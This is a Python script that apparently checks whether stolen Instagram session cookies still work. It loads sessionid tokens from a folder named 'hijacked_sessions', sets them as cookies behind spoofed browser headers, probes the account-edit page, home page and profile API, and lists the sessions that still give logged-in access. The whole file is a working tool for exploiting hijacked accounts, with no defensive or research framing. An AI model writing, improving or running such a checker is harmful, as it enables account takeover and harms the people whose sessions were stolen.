import json
import os
import requests
import time
from pathlib import Path
from datetime import datetime

SESSION_FILES = [
    'tools/session_alx_trading.json',
] + sorted([str(p) for p in Path('hijacked_sessions').glob('*.json')])

# Multiple endpoints to test session validity
VALIDATION_ENDPOINTS = {
    'edit': 'https://www.instagram.com/accounts/edit/',
    'home': 'https://www.instagram.com/',
    'api': ('https://www.instagram.com/api/v1/users/'
            'web_profile_info/?username=instagram')
}


def get_headers():
    """Get realistic browser headers"""
    return {
        'User-Agent': (
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
            '(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ),
        'Accept': (
            'text/html,application/xhtml+xml,application/xml;'
            'q=0.9,image/webp,*/*;q=0.8'
        ),
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
    }


def extract_sessionid(session_path):
    """Extract sessionid from various session file formats"""
    try:
        with open(session_path, 'r') as f:
            data = json.load(f)
        
        # Direct sessionid field
        if 'sessionid' in data:
            return data['sessionid']
        
        # Cookies array format
        if 'cookies' in data:
            for cookie in data['cookies']:
                if cookie.get('name') == 'sessionid':
                    return cookie.get('value')
        
        # Cookie string format
        if 'cookie' in data:
            cookies = data['cookie']
            if 'sessionid=' in cookies:
                start = cookies.find('sessionid=') + 10
                end = cookies.find(';', start)
                if end == -1:
                    end = len(cookies)
                return cookies[start:end]
                
    except Exception as e:
        print(f"[ERROR] Failed to read {session_path}: {e}")
    return None


def validate_session_comprehensive(sessionid):
    """Comprehensive session validation using multiple methods"""
    if not sessionid or len(sessionid) < 20:
        return {'valid': False, 'reason': 'Invalid sessionid format'}
    
    session = requests.Session()
    session.headers.update(get_headers())
    session.cookies.set('sessionid', sessionid, domain='.instagram.com')
    
    results = {}
    
    for endpoint_name, url in VALIDATION_ENDPOINTS.items():
        try:
            resp = session.get(url, allow_redirects=False, timeout=15)
            
            if endpoint_name == 'edit':
                # Check if we can access edit page
                if resp.status_code == 200 and 'form' in resp.text.lower():
                    results[endpoint_name] = {'status': 'valid', 'code': 200}
                elif (resp.status_code in (301, 302) and
                        'login' in resp.headers.get('Location', '')):
                    results[endpoint_name] = {
                        'status': 'invalid', 'code': resp.status_code
                    }
                else:
                    results[endpoint_name] = {
                        'status': 'unknown', 'code': resp.status_code
                    }
            
            elif endpoint_name == 'home':
                # Check if we see logged-in home page
                if resp.status_code == 200:
                    logged_in = ('Instagram' in resp.text and 
                                'login' not in resp.text.lower())
                    if logged_in:
                        results[endpoint_name] = {
                            'status': 'valid', 'code': 200
                        }
                    else:
                        results[endpoint_name] = {
                            'status': 'invalid', 'code': 200
                        }
                else:
                    results[endpoint_name] = {
                        'status': 'unknown', 'code': resp.status_code
                    }
            
            elif endpoint_name == 'api':
                # Check API access
                if resp.status_code == 200:
                    try:
                        json_data = resp.json()
                        if 'data' in json_data:
                            results[endpoint_name] = {
                                'status': 'valid', 'code': 200
                            }
                        else:
                            results[endpoint_name] = {
                                'status': 'invalid', 'code': 200
                            }
                    except (ValueError, KeyError):
                        results[endpoint_name] = {
                            'status': 'invalid', 'code': 200
                        }
                else:
                    results[endpoint_name] = {
                        'status': 'unknown', 'code': resp.status_code
                    }
            
            time.sleep(1)  # Rate limiting
            
        except Exception as e:
            results[endpoint_name] = {'status': 'error', 'error': str(e)}
    
    # Determine overall validity
    valid_results = [r for r in results.values() 
                    if r.get('status') == 'valid']
    valid_count = len(valid_results)
    total_tests = len(results)
    
    overall_valid = valid_count >= (total_tests // 2)  # Majority rule
    
    return {
        'valid': overall_valid,
        'score': f"{valid_count}/{total_tests}",
        'details': results
    }


def validate_session(sessionid):
    """Simple session validation (backward compatibility)"""
    result = validate_session_comprehensive(sessionid)
    return result['valid']


def main():
    print("\n" + "="*50)
    print("🔍 INSTAGRAM SESSION VALIDATOR")
    print("="*50)
    print(f"📅 Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"🔍 Testing {len(SESSION_FILES)} session files...")
    print("-"*50)
    
    valid_sessions = []
    invalid_sessions = []
    error_sessions = []
    
    for i, path in enumerate(SESSION_FILES, 1):
        if not os.path.exists(path):
            print(f"[{i:2d}] ❌ {path} - File not found")
            error_sessions.append(path)
            continue
            
        sessionid = extract_sessionid(path)
        if not sessionid:
            print(f"[{i:2d}] ❌ {path} - No sessionid found")
            error_sessions.append(path)
            continue
        
        print(f"[{i:2d}] 🔍 {path}...")
        print(f"     SessionID: {sessionid[:20]}...")
        
        result = validate_session_comprehensive(sessionid)
        
        if result['valid']:
            print(f"     ✅ VALID (Score: {result['score']})")
            valid_sessions.append(path)
        else:
            print(f"     ❌ INVALID (Score: {result['score']})")
            invalid_sessions.append(path)
        
        # Show detailed results
        for endpoint, details in result['details'].items():
            status_icon = "✅" if details.get('status') == 'valid' else "❌"
            status = details.get('status', 'unknown')
            print(f"     {status_icon} {endpoint}: {status}")
        
        print()
        time.sleep(2)  # Rate limiting between sessions
    
    # Summary
    print("="*50)
    print("📊 VALIDATION SUMMARY")
    print("="*50)
    print(f"✅ Valid Sessions: {len(valid_sessions)}")
    print(f"❌ Invalid Sessions: {len(invalid_sessions)}")
    print(f"⚠️  Error Sessions: {len(error_sessions)}")
    
    total_sessions = len(SESSION_FILES)
    success_rate = (len(valid_sessions) / total_sessions * 100 
                   if total_sessions > 0 else 0)
    print(f"📊 Success Rate: {len(valid_sessions)}/{total_sessions} "
          f"({success_rate:.1f}%)")
    
    if valid_sessions:
        print("\n🎯 VALID SESSIONS:")
        for session in valid_sessions:
            print(f"  • {session}")
    
    if invalid_sessions:
        print("\n❌ INVALID SESSIONS:")
        for session in invalid_sessions:
            print(f"  • {session}")
    
    if error_sessions:
        print("\n⚠️  ERROR SESSIONS:")
        for session in error_sessions:
            print(f"  • {session}")
    
    print("\n" + "="*50)
    return len(valid_sessions) > 0


if __name__ == "__main__":
    main()
